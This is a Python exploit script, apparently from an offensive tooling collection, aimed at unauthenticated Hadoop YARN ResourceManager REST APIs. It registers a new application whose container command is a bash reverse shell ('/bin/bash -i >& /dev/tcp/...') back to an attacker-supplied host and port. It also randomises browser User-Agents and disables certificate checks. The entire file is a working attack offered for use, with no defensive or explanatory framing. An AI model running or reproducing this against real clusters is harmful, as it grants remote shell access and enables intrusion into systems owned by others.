import requests
import json
import sys
import urllib3
from argparse import ArgumentParser
from urllib import parse
import random


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua


def check_vuln(url):
	url = parse.urlparse(url)
	url2=url.scheme + '://' + url.netloc 
	headers = {
		'User-Agent': get_ua(),
	}
	# data=base64.b64encode("eyJzZXQtcHJvcGVydHkiOnsicmVxdWVzdERpc3BhdGNoZXIucmVxdWVzdFBhcnNlcnMuZW5hYmxlUmVtb3RlU3RyZWFtaW5nIjp0cnVlfX0=")
	res1 = requests.post(url2 + '/ws/v1/cluster/apps/new-application', headers=headers)
	id = json.loads(res1.text)['application-id']
	data = {
		'application-id': id,
		'application-name': 'getshell',
		'am-container-spec': {
			'commands': {
				'command': '/bin/bash -i >& /dev/tcp/%s/%s 0>&1' % (lhost,port)
			},
		},
		'application-type': 'YARN',
	}


	res2 = requests.post(url2 + '/ws/v1/cluster/apps',json=data,headers=headers,timeout=10,verify=False)
	print("[+]执行完成")



if __name__ == '__main__':
	show = r'''

	 _			     _					  _		          _	 
	| |	            | |	                 | |	         | |	
	| |__   __ _  __| | ___   ___  _ __  | |__   __ _ ___| |__  
	| '_ \ / _` |/ _` |/ _ \ / _ \| '_ \ | '_ \ / _` / __| '_ \ 
	| | | | (_| | (_| | (_) | (_) | |_) || |_) | (_| \__ \ | | |
	|_| |_|\__,_|\__,_|\___/ \___/| .__/ |_.__/ \__,_|___/_| |_|
								  | |______					 
             					  |_|______|					 
																										  
							  			 By m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='hadoop未授权反弹shell By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-l",
						"--lhost",
						help="vps ip; Example:192.168.1.1")
	arg.add_argument("-p",
					"--port",
					help="vps port; Example:6666")
	args=arg.parse_args()
	url=args.url
	lhost=args.lhost
	port=args.port
	if url != None and lhost != None and port != None:
		print("[+]请先在%s监听%s端口" %(lhost,port)) 
		check_vuln(url)
	else:
		print("[-]请检查参数完整性！详情见-h")
